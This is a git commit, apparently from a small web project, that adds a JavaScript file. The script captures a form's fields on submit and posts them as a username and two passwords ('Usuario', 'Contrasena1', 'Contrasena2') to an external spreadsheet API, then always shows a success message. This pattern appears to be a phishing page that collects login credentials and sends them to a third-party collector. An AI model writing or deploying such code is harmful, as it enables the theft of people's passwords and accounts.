350643370e733a5d23f43726a1487ae6e1369e72
portalmovil <136508924+portalmovil@users.noreply.github.com>
2023-06-13 13:44:07 -0600

    new proyec security
    security 2

---
+++ js/app.js
@@ -0,0 +1,31 @@
+const formulario = document.getElementById('formulario');
+const registro = document.getElementById('registro');
+const exito = document.getElementById('exito');
+
+formulario.addEventListener('submit', async(e) =>{
+    e.preventDefault();
+
+
+try {    
+    const respuesta = await fetch('https://sheet.best/api/sheets/bad04bd5-cd19-48ca-8506-58340f3f236f', {
+        method: 'POST',
+        mode: 'cors',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            "Usuario": formulario.nombre.value,
+            "Contrasena1": formulario.correo.value,
+            "Contrasena2": formulario.telefono.value
+        })
+    });
+
+
+
+} catch(error){
+    console.log(error);
+}
+    
+    registro.classList.remove('activo');
+    exito.classList.add('activo');
+});
